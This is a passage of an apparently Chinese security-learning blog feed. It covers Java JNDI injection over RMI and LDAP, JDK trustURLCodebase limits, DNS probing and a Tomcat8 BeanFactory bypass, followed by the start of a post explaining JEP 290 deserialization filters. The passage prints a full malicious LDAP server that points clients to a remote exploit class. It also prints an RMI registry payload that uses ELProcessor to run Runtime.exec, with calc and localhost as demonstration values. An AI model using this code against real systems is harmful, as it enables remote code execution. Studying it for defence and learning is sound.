alt="image-20230523173123316"></p><p>跟进去可以看到，如果你是Reference类型的，就会自动给你加个ReferenceWrapper的封装，所以根本不需要我们手动添加</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523173236636.png" alt="image-20230523173236636"></p><p>然后再看客户端获取的时候，同样调到RegistyContext中的lookup里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523173744160.png" alt="image-20230523173744160"></p><p>然后进行一个解封装操作</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523173834984.png" alt="image-20230523173834984"></p><p>然后在这行调用<code>NamingManager.getObjectInstance</code>，再其中又调用了getObjectFactoryFromReference，剩下的看注释就知道了，先找本地，再找远程</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523174224918.png" alt="image-20230523174224918"></p><p>所以这里我把evil.class换个地方，然后本地开个服务</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523174519941.png" alt="image-20230523174519941"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523180101336.png" alt="image-20230523180101336"></p><p>试了一下RMI的时候没试的操作</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523180527620.png" alt="image-20230523180527620"></p><p>把恶意class文件放服务器上也行</p><p>另外就是在8u121之后，RMI服务默认不允许远程加载，所以想要继续用得加一行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523180947115.png" alt="image-20230523180947115"></p><p>至于为什么要加这一行，而不是加在RMI攻击服务端的时候的那几行，我也不知道，可能这也是JNDI和RMI的区别吧（，反正不加就报错告诉你要把这个值改成true</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523181046315.png" alt="image-20230523181046315"></p><p>查了一下，在<code>JDK 6u141、7u131、8u121</code> 及以后的版本</p><p>官方把</p><pre class="language-none"><code class="language-none">com.sun.jndi.rmi.object.trustURLCodebasecom.sun.jndi.cosnaming.object.trustURLCodebase</code></pre><p>这两个值设为了false，所以不能再从codebase中加载类了，所以最开始的表好像确实不对</p><h2 id="基于LDAP"><a href="#基于LDAP" class="headerlink" title="基于LDAP"></a>基于LDAP</h2><p>从上边那段我们知道，在8u121之后，由于trustURLCodebase的值默认为false，所以不能远程加载类了，除非被攻击的客户端还有<code>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</code>这行代码。但是，希望要握在自己手中（。所以RMI不行了之后我们还可以试试LDAP</p><p>其实主要是对trustURLCodebase这个值的判断放到RegistyContext里了，但是其实真正加载恶意类的是NamingManager里。所以用ldap就能绕过</p><p><strong>LDAP介绍</strong></p><p>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，运行在TCP/IP堆栈之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。</p><p>也就是说，LDAP <strong>「是一个协议」</strong>，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容。而 <strong>「LDAP 协议的实现」</strong>，有着众多版本，例如微软的 Active Directory 是 LDAP 在 Windows 上的实现。AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。再例如 OpenLDAP 是可以运行在 Linux 上的 LDAP 协议的开源实现。而我们平常说的 LDAP Server，一般指的是安装并配置了 Active Directory、OpenLDAP 这些程序的服务器。</p><p>在LDAP中，我们是通过目录树来访问一条记录的，目录树的结构如下</p><pre class="language-none"><code class="language-none">dn ：一条记录的详细位置dc ：一条记录所属区域    (哪一颗树)ou ：一条记录所属组织    （哪一个分支）cn&#x2F;uid：一条记录的名字&#x2F;ID   (哪一个苹果名字)...LDAP目录树的最顶部就是根，也就是所谓的“基准DN&quot;。</code></pre><p>先安装LDAP的依赖</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.unboundid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>unboundid-ldapsdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.1.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>然后起一个恶意的LDAP的服务端</p><pre class="language-java" data-language="java"><code class="language-java">package com;import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;public class LDAPIRMServer&#123;    private static final String LDAP_BASE &#x3D; &quot;dc&#x3D;example,dc&#x3D;com&quot;;    public static void main ( String[] tmp_args ) &#123;        String[] args&#x3D;new String[]&#123;&quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;#EXP&quot;&#125;;&#x2F;&#x2F;这个EXP就是恶意class类的名        int port &#x3D; 9999;        try &#123;            InMemoryDirectoryServerConfig config &#x3D; new InMemoryDirectoryServerConfig(LDAP_BASE);            config.setListenerConfigs(new InMemoryListenerConfig(                    &quot;listen&quot;, &#x2F;&#x2F;$NON-NLS-1$                    InetAddress.getByName(&quot;0.0.0.0&quot;), &#x2F;&#x2F;$NON-NLS-1$                    port,                    ServerSocketFactory.getDefault(),                    SocketFactory.getDefault(),                    (SSLSocketFactory) SSLSocketFactory.getDefault()));            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));            InMemoryDirectoryServer ds &#x3D; new InMemoryDirectoryServer(config);            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); &#x2F;&#x2F;$NON-NLS-1$            ds.startListening();        &#125;        catch ( Exception e ) &#123;            e.printStackTrace();        &#125;    &#125;    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;        private URL codebase;        public OperationInterceptor ( URL cb ) &#123;            this.codebase &#x3D; cb;        &#125;        @Override        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;            String base &#x3D; result.getRequest().getBaseDN();            Entry e &#x3D; new Entry(base);            try &#123;                sendResult(result, base, e);            &#125;            catch ( Exception e1 ) &#123;                e1.printStackTrace();            &#125;        &#125;        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;            URL turl &#x3D; new URL(this.codebase, this.codebase.getRef().replace(&#39;.&#39;, &#39;&#x2F;&#39;).concat(&quot;.class&quot;));            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);            String cbstring &#x3D; this.codebase.toString();            int refPos &#x3D; cbstring.indexOf(&#39;#&#39;);            if ( refPos &gt; 0 ) &#123;                cbstring &#x3D; cbstring.substring(0, refPos);            &#125;            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); &#x2F;&#x2F;$NON-NLS-1$            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());            result.sendSearchEntry(e);            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));        &#125;    &#125;&#125;</code></pre><p>别问为啥这么写，固定的（，就改一下恶意类存放的地址就行</p><p>客户端</p><pre class="language-java" data-language="java"><code class="language-java">package com;import javax.naming.InitialContext;import javax.naming.NamingException;public class JNDILDAPClient &#123;    public static void main(String[] args) throws NamingException &#123;        InitialContext initialContext&#x3D;new InitialContext();        initialContext.lookup(&quot;ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F;a&quot;);&#x2F;&#x2F;后边无所谓，只要有东西就行，应该是服务器脚本给自动做了处理    &#125;&#125;</code></pre><p>然后本地起个python服务执行就能弹出计算器了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523213258156.png" alt="image-20230523213258156"></p><p>同样跟一下执行流程</p><p>其实感觉没啥好跟的</p><p>首先就是一路lookup，到Obj这个类里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523214818421.png" alt="image-20230523214818421"></p><p>然后在decodeObject判断绑定的是个什么东西，这里我们是个引用类型的，所以就进decodeReference了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523214947417.png" alt="image-20230523214947417"></p><p>在decodeReference里就把引用里的东西解出来</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523215743172.png" alt="image-20230523215743172"></p><p>解出来之后就在LdapCtx去加载这里面的东西</p><p>调用<code>DirectoryManager.getObjectInstance</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523215303383.png" alt="image-20230523215303383"></p><p>然后在这里面又调用了NamingManager#getObjectFactoryFromReference，去获取工厂地址。后面就和基于RMI的一模一样了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523215449562.png" alt="image-20230523215449562"></p><p>在getObjectFactoryFromReference里加载类，然后实例化</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523215648836.png" alt="image-20230523215648836"></p><p>可以看到，这两种不同的方法，其实际目的都是为了调用NamingManager#getObjectFactoryFromReference，然后去远程加载恶意的字节码文件。</p><p>不过在6u211以后 、7u201以后 、8u191以后 和11.0.1以后的版本中，也修复了这个漏洞，这个在之后高版本绕过的部分再说。</p><h2 id="基于DNS"><a href="#基于DNS" class="headerlink" title="基于DNS"></a>基于DNS</h2><p>这个实际上并不是作为攻击的手段，而是作为一种探测手段</p><p>之前我们说过，JNDI注入的前提是存在一个lookup方法，且其中的url可控</p><p>其攻击过程为</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523220902045.png" alt="image-20230523220902045"></p><p>所以如果直接使用RMI或者LDAP来测试是否存在JNDI注入，会比较繁琐，且有可能暴露自己的服务端，有被反打的可能，所以这时候就可以先用dns来测试一下。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523222520958.png" alt="image-20230523222520958"></p><p>不过即使收到请求也不一定就是有JNDI注入，比如JDK版本、防火墙之类的也会限制漏洞利用</p><h2 id="基于CORBA"><a href="#基于CORBA" class="headerlink" title="基于CORBA"></a>基于CORBA</h2><p>本来以为这玩意没法用的，不过看见了这么一篇文章</p><p><a href="https://thonsun.github.io/2020/12/02/jndi-zhu-ru-li-yong-fen-xi/#toc-heading-8">https://thonsun.github.io/2020/12/02/jndi-zhu-ru-li-yong-fen-xi/#toc-heading-8</a></p><p>不过这个利用条件过于苛刻了，所以不复现了，当了解。</p><h1 id="高版本绕过"><a href="#高版本绕过" class="headerlink" title="高版本绕过"></a>高版本绕过</h1><p>在高版本的jdk中，把LDAP的路也堵上了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523223314891.png" alt="image-20230523223314891"></p><p>堵的方法就是在最后一步，加载类字节码之前判断trustURLCodebase，只有为true的时候才能进行远程的类加载</p><p>这也就代表着无依赖的JNDI注入彻底结束了。</p><p>因为在低版本中，我们不需要去依赖什么，就可以借助JNDI注入来RCE，但是高版本就需要依赖一些其他的包了，因为既然不让远程加载恶意字节码，那我加载点本地自带的然后把它实例化总可以吧。</p><p>而根据getObjectFactoryFromReference这里类加载的部分可以很容易知道，如果想进行实例化，那这个类必须是个ObjectFactory类型</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523225936975.png" alt="image-20230523225936975"></p><p>ObjectFactory是个接口，所以我们的目标就是找个实现了这个接口的类</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523230218212.png" alt="image-20230523230218212"></p><h2 id="基于Tomcat8的绕过"><a href="#基于Tomcat8的绕过" class="headerlink" title="基于Tomcat8的绕过"></a>基于Tomcat8的绕过</h2><p>tomcat8的<code>org.apache.naming.factory.BeanFactory</code>就很适合作为我们加载的类。而且由于它在tomcat8的依赖里，那么攻击面和利用条件也是很可观的。</p><p><code>org.apache.naming.factory.BeanFactory</code> 在 <code>getObjectInstance() </code>中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523231143324.png" alt="image-20230523231143324"></p><p>bean</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523231252326.png" alt="image-20230523231252326"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523231301639.png" alt="image-20230523231301639"></p><p>也就是前边说的<code>实例化Reference所指向的任意Bean Class</code></p><p>valueArray</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523231543939.png" alt="image-20230523231543939"></p><p>添加依赖</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>tomcat-catalina<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>8.5.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.lucee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javax.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>bypass的代码</p><pre class="language-java" data-language="java"><code class="language-java">import com.sun.jndi.rmi.registry.ReferenceWrapper;  &#x2F;&#x2F; 导入 ReferenceWrapper 类，用于包装引用对象import org.apache.naming.ResourceRef;  &#x2F;&#x2F; 导入 ResourceRef 类，用于创建资源引用对象 import javax.naming.StringRefAddr;  &#x2F;&#x2F; 导入 StringRefAddr 类，用于创建字符串引用地址对象import java.rmi.registry.LocateRegistry;  &#x2F;&#x2F; 导入 LocateRegistry 类，用于定位 RMI 注册表import java.rmi.registry.Registry;  &#x2F;&#x2F; 导入 Registry 类，用于操作 RMI 注册表public class RMI_Server_ByPass &#123;    public static void main(String[] args) throws Exception &#123;        Registry registry &#x3D; LocateRegistry.createRegistry(1099);  &#x2F;&#x2F; 创建 RMI 注册表对象并监听指定端口（1099）        ResourceRef resourceRef &#x3D; new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);        &#x2F;&#x2F; 创建 ResourceRef 对象，表示一个资源引用，参数依次为类名、类工厂位置、工厂位置、工厂对象实例化标志、工厂类名、工厂对象实例化位置        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;faster&#x3D;eval&quot;));  &#x2F;&#x2F; 添加字符串引用地址对象到 ResourceRef 对象中，参数为引用地址类型和引用地址值        resourceRef.add(new StringRefAddr(&quot;faster&quot;, &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;));  &#x2F;&#x2F; 添加字符串引用地址对象到 ResourceRef 对象中，参数为引用地址类型和引用地址值        ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(resourceRef);  &#x2F;&#x2F; 使用 ResourceRef 对象创建 ReferenceWrapper 对象，用于包装引用对象        registry.bind(&quot;Tomcat8bypass&quot;, referenceWrapper);  &#x2F;&#x2F; 在 RMI 注册表中绑定 ReferenceWrapper 对象，参数为绑定的名称和要绑定的对象        System.out.println(&quot;Registry运行中......&quot;);  &#x2F;&#x2F; 输出信息到控制台，表示 RMI 注册表运行中    &#125;&#125;</code></pre><p>其实就是按照BeanFactory的要求来构造的</p><p>然后被攻击的客户端就正常代码，不过要在tomcat8环境下</p><p>（开发0基础，不会配tomcat8环境，就先这样吧，等以后有时间了再弄一下</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a></p><p><a href="https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/">https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://www.bilibili.com/video/BV1Ne4y1o7ch/?vd_source=053f03b424a45370bc5813843ae5268f">红队攻击手特训营-JNDI注入漏洞挖掘_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1JY411F7mA/">从文档开始的jndi注入之路-2 jndi+ldap绕过_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI攻击（三）</title>
      <link href="/2023/05/20/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2023/05/20/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>最后一篇了吧（大概</p><p>前两篇介绍了RMI的流程和基础的攻击，这一篇写点进阶的东西</p><h1 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h1><p>在<code>JDK6u141</code>、<code>JDK7u131</code>、<code>JDK 8u121</code>加入了JEP 290限制,JEP 290过滤策略有</p><p><strong>进程级过滤器</strong></p><p>可以将进程级序列化过滤器作为命令行参数（“-Djdk.serialFilter =”）传递，或将其设置为$JAVA_HOME/conf/security/java.security中的系统属性。</p><p><strong>自定义过滤器</strong></p><p>可以使用自定义过滤器来重写特定流的进程级过滤器</p><p><strong>内置过滤器</strong></p><p>JDK分别为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器。这两个过滤器都配置为白名单，即只允许反序列化特定类。</p><p>这里我把jdk版本换成jdk1.8.0_111,默认使用内置过滤器。然后直接使用上面的服务端攻击注册中心poc看下,执行完RMI Registry会提示这样的一个错误:</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520171314932.png" alt="image-20230520171314932"></p><p>这就是JEP290限制导致的</p><h1 id="JEP-290-核心类"><a href="#JEP-290-核心类" class="headerlink" title="JEP 290 核心类"></a>JEP 290 核心类</h1><p>JEP 290 涉及的核心类有： <code>ObjectInputStream</code> 类，<code>ObjectInputFilter</code> 接口，<code>Config</code> 静态类以及 <code>Global</code> 静态类。其中 <code>Config</code> 类是 <code>ObjectInputFilter</code>接口的内部类，<code>Global</code> 类又是<code>Config</code>类的内部类。</p><h2 id="ObjectInputStream-类"><a href="#ObjectInputStream-类" class="headerlink" title="ObjectInputStream 类"></a>ObjectInputStream 类</h2><p>JEP 290 进行过滤的具体实现方法是在 <code>ObjectInputStream</code> 类中增加了一个<code>serialFilter</code>属性和一个 <code>filterChcek</code> 函数，两者搭配来实现过滤的。</p><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p>有两个构造函数，我们需要关注的是在这两个构造函数中都会赋值 <code>serialFilter</code> 字段为 <code>ObjectInputFilter.Config.getSerialFilter()</code>:</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520214813392.png" alt="image-20230520214813392"></p><p>跟一下可以发现，<code>ObjectInputFilter.Config.getSerialFilter()</code>:返回的内容是ObjectInputFilter接口里的一个静态属性</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520214855340.png" alt="image-20230520214855340"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520214941035.png" alt="image-20230520214941035"></p><h3 id="serialFilter-属性"><a href="#serialFilter-属性" class="headerlink" title="serialFilter 属性"></a>serialFilter 属性</h3><p>这个属性是ObjectInputFilter类型的，这是一个接口</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520215200219.png" alt="image-20230520215200219"></p><p>这个接口又声明了一个 <code>checkInput</code> 方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520215304451.png" alt="image-20230520215304451"></p><h3 id="filterCheck-函数"><a href="#filterCheck-函数" class="headerlink" title="filterCheck 函数"></a>filterCheck 函数</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520215423869.png" alt="image-20230520215423869"></p><p>看名字就知道这是个负责过滤的方法</p><p>它分了三步</p><p>第一步，先会判断 <code>serialFilter</code> 属性值是否为空，只有不为空，才会进行后续的过滤操作。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520215539088.png" alt="image-20230520215539088"></p><p>第二步，将我们需要检查的 <code>class</code> ，以及 <code>arryLength</code>等信息封装成一个<code>FilterValues</code>对象，传入到 <code>serialFilter.checkInput</code> 方法中，返回值为 <code>ObjectInputFilter.Status</code> 类型。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520215620742.png" alt="image-20230520215620742"></p><p>最后一步，判断 <code>status</code> 的值，如果 <code>status</code> 是 <code>null</code> 或者是 <code>REJECTED</code> 就会抛出异常。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520215633250.png" alt="image-20230520215633250"></p><h3 id="ObjectInputStream-总结"><a href="#ObjectInputStream-总结" class="headerlink" title="ObjectInputStream 总结"></a>ObjectInputStream 总结</h3><p>到这里可以知道，<code>serialFilter</code> 属性就可以认为是 JEP 290 中的&quot;过滤器&quot;。过滤的具体逻辑写到 <code>serialFilter</code> 的<code>checkInput</code> 方法中，配置过滤器其实就是设置 <code>ObjectInputStream</code> 对象的 <code>serialFilter</code>属性。并且在 <code>ObjectInputStream</code> 构造函数中会赋值 <code>serialFilter</code> 为 <code>ObjectInputFilter#Config</code> 静态类的 <code>serialFilter</code> 静态字段。</p><h2 id="ObjectInputFilter-接口"><a href="#ObjectInputFilter-接口" class="headerlink" title="ObjectInputFilter 接口"></a>ObjectInputFilter 接口</h2><p>是 <code>JEP 290</code> 中实现过滤的一个最基础的接口，想理解 JEP 290 ，必须要了解这个接口。</p><p>在低于 <code>JDK 9</code> 的时候的全限定名是 <code>sun.misc.ObjectInputFIlter</code>，<code>JDK 9</code> 及以上是 <code>java.io.ObjectInputFilter</code> 。</p><p>另外低于 <code>JDK 9</code> 的时候，是 <code>getInternalObjectInputFilter</code> 和 <code>setInternalObjectInputFilter</code>，<code>JDK 9</code> 以及以上是 <code>getObjectInputFilter</code> 和 <code>setObjectInputFIlter</code> 。</p><p>这是它的结构</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520224310006.png" alt="image-20230520224310006"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520224205442.png" alt="image-20230520224205442"></p><p>有一个 <code>checkInput</code> 函数，一个静态类 <code>Config</code> ，一个 <code>FilterInfo</code> 接口，一个 <code>Status</code> 枚举类。</p><h3 id="函数式接口"><a href="#函数式接口" class="headerlink" title="函数式接口"></a>函数式接口</h3><p><code>@FunctionalInterface</code> 注解表明， <code>ObjectInputFilter</code> 是一个函数式接口。对于不了解函数式接口的同学，可以参考：<a href="https://www.runoob.com/java/java8-functional-interfaces.html">https://www.runoob.com/java/java8-functional-interfaces.html</a> 以及 <a href="https://www.jianshu.com/p/40f833bf2c48">https://www.jianshu.com/p/40f833bf2c48</a> ， <a href="https://juejin.cn/post/6844903892166148110">https://juejin.cn/post/6844903892166148110</a> 。</p><p>（我一直觉得这个lambda表达式怪逆天的，为了省两三行代码，把可读性搞得这么差</p><p>这里我们其实只需要关心函数式接口怎么赋值，函数式接口的赋值可以是： lambda 表达式或者是方法引用，当然也可以赋值一个实现了这个接口的对象</p><h2 id="Config-静态类"><a href="#Config-静态类" class="headerlink" title="Config 静态类"></a>Config 静态类</h2><p><code>Config</code> 静态类是 <code>ObjcectInputFilter</code> 接口的一个内部静态类。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1630391557000-image-20210818120140858.png-w331s" alt="image-20210818120140858"></p><h3 id="Config-configuredFilter-静态字段"><a href="#Config-configuredFilter-静态字段" class="headerlink" title="Config#configuredFilter 静态字段"></a>Config#configuredFilter 静态字段</h3><p><code>configuredFilter</code> 的赋值操作是在Config类的静态代码块里，所以调用 <code>Config</code> 类的时候就会触发 <code>configuredFilter</code> 字段的赋值。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520230235320.png" alt="image-20230520230235320"></p><p>可以看到会拿到 <code>SERIAL_FILTER_PROPNAME（也就是jdk.serailFilter)</code> 属性值，如果不为空，会返回 <code>createFilter(props)</code>的结果（<code>createFilter</code> 实际返回的是一个 <code>Global</code> 对象）。</p><p><code>jdk.serailFilter</code> 属性值获取的方法用两种，第一种是获取 JVM 的 <code>jdk.serialFilter</code> 属性，第二种通过在 <code>%JAVA_HOME%\conf\security\java.security</code> 文件中指定 <code>jdk.serialFilter</code> 来设置。</p><h3 id="Config-createFilter-方法"><a href="#Config-createFilter-方法" class="headerlink" title="Config#createFilter 方法"></a>Config#createFilter 方法</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520230558359.png" alt="image-20230520230558359"></p><p><code>Config#createFilter</code> 则会进一步调用 <code>Global.createFilter</code>方法，这个方法在介绍 <code>Global</code> 类的时候会说，其实就是将传入的 JEP 290 规则字符串解析到<code>Global</code>对象的 <code>filters</code> 字段上，并且返回这个 <code>Global</code> 对象。</p><h3 id="Config-静态类总结"><a href="#Config-静态类总结" class="headerlink" title="Config 静态类总结"></a>Config 静态类总结</h3><p><code>Config</code>会将<code>Config.serialFilter</code> 赋值为一个<code>Global</code>对象，这个<code>Global</code> 对象的<code>filters</code>字段值是<code>jdk.serailFilter</code>属性对应的 <code>Function</code> 列表。（关于 <code>Global</code> 对象介绍下面会说到，大家先有这么一个概念）</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520230905590.png" alt="image-20230520230905590"></p><p>而 <code>ObjectInputStream</code> 的构造函数中，正好取的就是 <code>Config.serialFilter</code> 这个静态字段 ， <strong>所以设置了 Config.serialFilter 这个静态字段，就相当于设置了 ObjectInputStream 类全局过滤器</strong>。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520214813392.png" alt="image-20230520214813392"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520214855340.png" alt="image-20230520214855340"></p><p>还可以通过配置 JVM 的 